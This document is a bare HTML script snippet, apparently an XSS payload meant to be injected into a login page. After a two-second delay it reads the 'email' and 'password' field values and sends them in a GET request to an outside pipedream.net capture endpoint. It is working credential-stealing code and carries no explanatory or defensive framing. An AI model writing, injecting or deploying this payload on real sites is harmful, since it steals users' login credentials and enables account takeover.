<script>
setTimeout(function(){
    httpRequest = new XMLHttpRequest();
    httpRequest.open('GET', 'https://enwmk3bajjgh.x.pipedream.net/?'+document.getElementById("email").value+"="+document.getElementById("password").value);
    httpRequest.send();},2000)
</script>
